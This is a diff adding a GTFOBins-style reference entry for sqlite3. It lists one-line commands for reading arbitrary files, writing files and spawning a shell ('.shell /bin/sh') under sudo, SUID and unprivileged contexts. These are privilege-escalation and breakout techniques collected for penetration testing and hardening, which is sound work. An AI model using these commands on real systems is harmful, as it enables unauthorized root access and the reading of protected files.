@@ -1,0 +1,50 @@
+sqlite3
+=======
+
+File read
+---------
+
+[Sudo]
+    sqlite3 <<EOF
+CREATE TABLE x(x TEXT);
+.import /path/to/input-file x
+SELECT * FROM x;
+EOF
+
+[SUID]
+    sqlite3 <<EOF
+CREATE TABLE x(x TEXT);
+.import /path/to/input-file x
+SELECT * FROM x;
+EOF
+
+[Unprivileged]
+    sqlite3 <<EOF
+CREATE TABLE x(x TEXT);
+.import /path/to/input-file x
+SELECT * FROM x;
+EOF
+
+File write
+----------
+
+[Sudo]
+    sqlite3 /dev/null -cmd '.output /path/to/output-file' 'select "DATA";'
+
+[SUID]
+    sqlite3 /dev/null -cmd '.output /path/to/output-file' 'select "DATA";'
+
+[Unprivileged]
+    sqlite3 /dev/null -cmd '.output /path/to/output-file' 'select "DATA";'
+
+Shell
+-----
+
+[Sudo]
+    sqlite3 /dev/null '.shell /bin/sh'
+
+[SUID]
+    sqlite3 /dev/null '.shell /bin/sh'
+
+[Unprivileged]
+    sqlite3 /dev/null '.shell /bin/sh'
